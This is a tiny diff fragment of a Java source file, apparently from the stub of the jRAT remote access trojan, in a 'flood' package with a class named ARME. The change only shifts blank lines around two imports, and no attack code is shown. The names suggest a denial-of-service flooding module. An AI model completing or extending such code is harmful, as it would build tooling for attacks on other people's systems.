@@ -1,8 +1,8 @@
 package pro.jrat.stub.flood;
+
 import java.net.Socket;
 
 import pro.jrat.stub.Constants;
-
 
 public class ARME implements Runnable {
 
